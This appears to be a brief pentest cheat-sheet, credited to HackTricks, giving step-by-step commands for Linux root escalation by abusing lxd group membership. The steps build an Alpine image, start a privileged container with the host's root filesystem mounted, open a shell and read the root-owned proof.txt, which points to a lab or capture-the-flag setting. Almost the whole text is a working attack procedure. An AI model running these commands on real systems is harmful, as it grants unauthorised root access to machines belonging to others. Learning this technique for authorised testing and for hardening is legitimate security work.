# LXC-LXD Group

## Source: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

## Steps:

### 1) Attacker: Download Alpine Image

    git clone https://github.com/alpinelinux/docker-alpine

### 2) Attacker: Build Image

    sudo ./build-alpine -a i686

### Transfer to machine for the rest of the privesc

#### 1) 

    lxc init

#### 2) 

    lxc image list

#### 3) Upload image to target

#### 4) 

    lxc image import <image.tar.gz> --alias myalpine

#### 5) 

    lxc storage create default dir

#### 6)

    lxc init myalpine jimmy -c security.privileged=true -s default

#### 6) 

    lxc config device add jimmy mydevice disk source=/ path=/mnt/root recursive=true

#### 7) 

    lxc start jimmy

#### 8) 

    lxc exec jimmy /bin/sh

#### 8) GGWP!

    cat /mnt/root/root/proof.txt
